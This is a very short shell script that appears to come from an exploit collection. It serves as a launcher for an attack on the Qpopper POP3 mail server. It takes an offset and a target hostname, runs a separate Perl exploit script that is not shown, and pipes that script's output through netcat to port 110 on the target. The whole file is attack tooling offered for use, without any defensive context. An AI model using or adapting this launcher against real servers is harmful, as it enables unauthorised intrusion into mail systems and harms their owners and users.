#!/bin/sh
#
# TheEleetCow Qpop.sh exploit (qpop.pl)
# very very simple scr.
# Usage: ./qpop <offset> <hostname> 
# 
./qpop.pl $1 | nc -v $2 110
